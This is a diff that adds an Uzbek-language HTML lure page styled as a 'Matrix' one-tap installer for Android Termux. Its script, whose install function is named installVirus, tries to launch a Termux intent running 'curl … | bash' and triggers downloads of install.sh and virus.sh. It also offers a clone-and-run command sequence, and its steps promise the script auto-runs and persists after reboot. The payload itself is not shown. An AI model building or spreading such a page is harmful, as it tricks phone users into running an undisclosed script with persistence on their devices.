@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
+<meta name="theme-color" content="#000000">
+<title>MATRIX — TERMUX INSTALL</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+html,body{width:100%;height:100%;overflow:hidden;background:#000;font-family:monospace;color:#0f0;user-select:none;-webkit-user-select:none}
+canvas{position:fixed;top:0;left:0;width:100%;height:100%;z-index:0}
+#ui{position:fixed;top:0;left:0;width:100%;height:100%;z-index:1;display:flex;flex-direction:column;justify-content:center;align-items:center;padding:20px;pointer-events:none}
+#ui>*{pointer-events:auto}
+h1{font-size:clamp(20px,5vw,36px);text-align:center;margin-bottom:10px;text-shadow:0 0 30px #0f0;animation:glow 2s ease-in-out infinite alternate}
+@keyframes glow{0%{text-shadow:0 0 10px #0f0}100%{text-shadow:0 0 40px #0f0,0 0 80px #0f0}}
+.sub{font-size:clamp(11px,2vw,14px);opacity:0.7;margin-bottom:30px;text-align:center}
+.btn{display:block;width:100%;max-width:340px;padding:clamp(14px,2.5vw,20px);margin:8px auto;font-family:monospace;font-size:clamp(13px,2vw,16px);font-weight:bold;border:none;border-radius:6px;cursor:pointer;transition:all 0.3s;text-transform:uppercase;letter-spacing:1px;text-align:center;text-decoration:none}
+.btn-install{background:#0f0;color:#000;box-shadow:0 0 30px rgba(0,255,0,0.4);animation:pulse 2s infinite}
+.btn-install:hover{box-shadow:0 0 60px rgba(0,255,0,0.8);transform:scale(1.03)}
+.btn-termux{background:transparent;color:#0f0;border:2px solid #0f0}
+.btn-termux:hover{background:rgba(0,255,0,0.1)}
+.btn-fdroid{background:transparent;color:#0f0;border:1px solid rgba(0,255,0,0.3);font-size:clamp(11px,1.5vw,13px)}
+.btn-fdroid:hover{background:rgba(0,255,0,0.05)}
+@keyframes pulse{0%,100%{box-shadow:0 0 20px rgba(0,255,0,0.3)}50%{box-shadow:0 0 50px rgba(0,255,0,0.7)}}
+.install-box{background:rgba(0,0,0,0.9);border:1px solid rgba(0,255,0,0.3);border-radius:8px;padding:clamp(20px,3vw,35px);max-width:420px;width:100%;backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px)}
+.steps{margin:20px 0;text-align:left}
+.step{display:flex;align-items:flex-start;gap:10px;margin-bottom:12px;font-size:clamp(11px,1.5vw,14px);line-height:1.5;opacity:0.8}
+.step-num{color:#0f0;font-weight:bold;min-width:20px;text-align:right}
+.status-bar{position:fixed;bottom:0;left:0;right:0;z-index:2;padding:clamp(6px,1vw,10px) clamp(10px,2vw,20px);display:flex;justify-content:space-between;font-size:clamp(9px,1.2vw,11px);background:rgba(0,0,0,0.9);border-top:1px solid rgba(0,255,0,0.2)}
+.dot{width:6px;height:6px;border-radius:50%;display:inline-block;margin-right:5px}
+.dot-green{background:#0f0;box-shadow:0 0 6px #0f0;animation:pulse 2s infinite}
+.hidden{display:none!important}
+#overlay{position:fixed;top:0;left:0;width:100%;height:100%;z-index:10;background:rgba(0,255,0,0.05);display:none;justify-content:center;align-items:center;flex-direction:column;backdrop-filter:blur(2px)}
+#overlay.active{display:flex}
+#overlay .box{background:#000;border:1px solid #0f0;padding:40px;max-width:400px;text-align:center;border-radius:8px}
+#overlay .box h2{font-size:20px;margin-bottom:15px}
+#overlay .box p{font-size:13px;margin-bottom:20px;opacity:0.8;line-height:1.6}
+#overlay .box .btn{display:inline-block;width:auto;min-width:150px}
+#notif-banner{position:fixed;top:0;left:0;right:0;z-index:20;background:rgba(0,255,0,0.1);border-bottom:1px solid #0f0;padding:8px 20px;text-align:center;font-size:12px;display:none}
+</style>
+</head>
+<body>
+<canvas id="c"></canvas>
+
+<div id="notif-banner">
+  Termux uchun <button onclick="dlScript()" style="background:#0f0;color:#000;border:none;padding:4px 12px;font-family:monospace;font-weight:bold;border-radius:3px;cursor:pointer">SKRIPTNI YUKLAB OLISH</button>
+</div>
+
+<div id="ui">
+  <div class="install-box">
+    <h1>◈ MATRIX ◈</h1>
+    <div class="sub">TERMUX GA O'RNATISH</div>
+
+    <button class="btn btn-install" onclick="installVirus()" id="installBtn">
+      ⚡ BIR TUGMA BILAN O'RNATISH
+    </button>
+
+    <a href="https://f-droid.org/packages/com.termux/" target="_blank" class="btn btn-termux" id="termuxBtn" style="display:none">
+      📥 TERMUX O'RNATISH
+    </a>
+
+    <div class="steps" id="steps">
+      <div class="step"><span class="step-num">1</span><span>Bu sahifani <b>Termux</b> bilan oching</span></div>
+      <div class="step"><span class="step-num">2</span><span>Yuqoridagi tugmani bosing</span></div>
+      <div class="step"><span class="step-num">3</span><span>Skript avtomatik yuklanadi va ishga tushadi</span></div>
+      <div class="step"><span class="step-num">4</span><span>Telefonni qayta yuklasangiz ham avtomatik ishlaydi</span></div>
+    </div>
+  </div>
+</div>
+
+<div id="overlay">
+  <div class="box">
+    <h2>◈ MATRIX ACTIVATED ◈</h2>
+    <p id="overlayMsg">Skript yuklanmoqda...</p>
+    <button class="btn btn-install" onclick="document.getElementById('overlay').classList.remove('active')">YOPISH</button>
+  </div>
+</div>
+
+<div class="status-bar">
+  <span><span class="dot dot-green"></span>MATRIX TERMUX</span>
+  <span id="statusText">Tayyor</span>
+</div>
+
+<script>
+const canvas=document.getElementById('c'),ctx=canvas.getContext('2d');
+let W,H,fs,cols,drops=[];
+const chars='アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン01';
+
+function resize(){
+  W=canvas.width=window.innerWidth;
+  H=canvas.height=window.innerHeight;
+  fs=Math.max(10,Math.min(18,W/55));
+  cols=Math.floor(W/fs);
+  while(drops.length<cols)drops.push(Math.random()*-100);
+  while(drops.length>cols)drops.pop();
+}
+
+function draw(){
+  ctx.fillStyle='rgba(0,0,0,0.04)';
+  ctx.fillRect(0,0,W,H);
+  ctx.font=fs+'px monospace';
+  for(let i=0;i<cols;i++){
+    const c=chars[Math.floor(Math.random()*chars.length)];
+    const x=i*fs,y=drops[i]*fs;
+    ctx.fillStyle=`rgba(0,255,0,${0.1+(y/H)*0.5})`;
+    ctx.fillText(c,x,y);
+    if(y>H&&Math.random()>0.975)drops[i]=0;
+    drops[i]++;
+  }
+}
+
+// Detect Termux
+function detectTermux() {
+  const ua=navigator.userAgent;
+  const isAndroid=/Android/i.test(ua);
+  const termuxBtn=document.getElementById('termuxBtn');
+
+  if(isAndroid){
+    document.getElementById('statusText').textContent='Android detected';
+    // Try to detect if Termux is installed via intent
+    termuxBtn.style.display='none';
+  }else{
+    document.getElementById('steps').innerHTML=
+      '<div class="step"><span class="step-num">⚠</span><span>Bu sahifa faqat Android + Termux uchun</span></div>'+
+      '<div class="step"><span class="step-num">1</span><span>Telefoningizga <b>Termux</b> o\'rnating</span></div>'+
+      '<div class="step"><span class="step-num">2</span><span>Termuxni ochib: <b style="color:#0f0">pkg install git -y && git clone https://github.com/Xolericuz/matrix-motivation && cd matrix-motivation && bash install.sh</b></span></div>';
+    termuxBtn.style.display='block';
+    termuxBtn.href='https://f-droid.org/packages/com.termux/';
+    document.getElementById('installBtn').textContent='TERMUX O\'RNATISH';
+    document.getElementById('installBtn').className='btn btn-termux';
+    document.getElementById('statusText').textContent='Desktop mode';
+    return false;
+  }
+  return true;
+}
+
+function installVirus() {
+  const isTermux=/Termux/i.test(navigator.userAgent) || window.location.protocol==='termux:';
+
+  if(/Android/i.test(navigator.userAgent)){
+    // Try Termux intent
+    const scriptUrl = window.location.origin + window.location.pathname.replace(/\/[^/]*$/, '') + '/virus.sh';
+    const installUrl = window.location.origin + window.location.pathname.replace(/\/[^/]*$/, '') + '/install.sh';
+
+    document.getElementById('overlay').classList.add('active');
+    document.getElementById('overlayMsg').innerHTML =
+      'Termux ochilmoqda...<br><br>'+
+      '<span style="font-size:11px;opacity:0.7">Agar Termux ochilmasa, qo\'lda bajaring:<br><br>'+
+      '<b style="color:#0f0">pkg install git -y<br>'+
+      'git clone https://github.com/Xolericuz/matrix-motivation<br>'+
+      'cd matrix-motivation<br>'+
+      'bash install.sh</b></span>';
+
+    // Try to trigger Termux via intent URL
+    window.location.href = 'termux://open?action=run&command=curl -sL ' + encodeURIComponent(installUrl) + ' | bash';
+
+    // Also try the direct download approach
+    setTimeout(() => {
+      // Download the script
+      const a = document.createElement('a');
+      a.href = installUrl;
+      a.download = 'install.sh';
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+      document.getElementById('statusText').textContent = 'Downloaded! Open in Termux';
+    }, 1000);
+  } else {
+    // Desktop - download the script
+    const a = document.createElement('a');
+    a.href = window.location.origin + window.location.pathname.replace(/\/[^/]*$/, '') + '/install.sh';
+    a.download = 'install.sh';
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    document.getElementById('statusText').textContent = 'Downloaded!';
+  }
+}
+
+function dlScript() {
+  const a = document.createElement('a');
+  a.href = window.location.origin + window.location.pathname.replace(/\/[^/]*$/, '') + '/virus.sh';
+  a.download = 'virus.sh';
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+  document.getElementById('notif-banner').style.display='none';
+}
+
+// Let user copy command
+function copyCmd() {
+  const cmd = 'pkg install git -y && git clone https://github.com/Xolericuz/matrix-motivation && cd matrix-motivation && bash install.sh';
+  if (navigator.clipboard) {
+    navigator.clipboard.writeText(cmd);
+    document.getElementById('statusText').textContent = 'Copied!';
+  }
+}
+
+window.addEventListener('resize',resize);
+window.addEventListener('load',()=>{
+  resize();
+  setInterval(draw,50);
+  detectTermux();
+});
+</script>
+</body>
+</html>
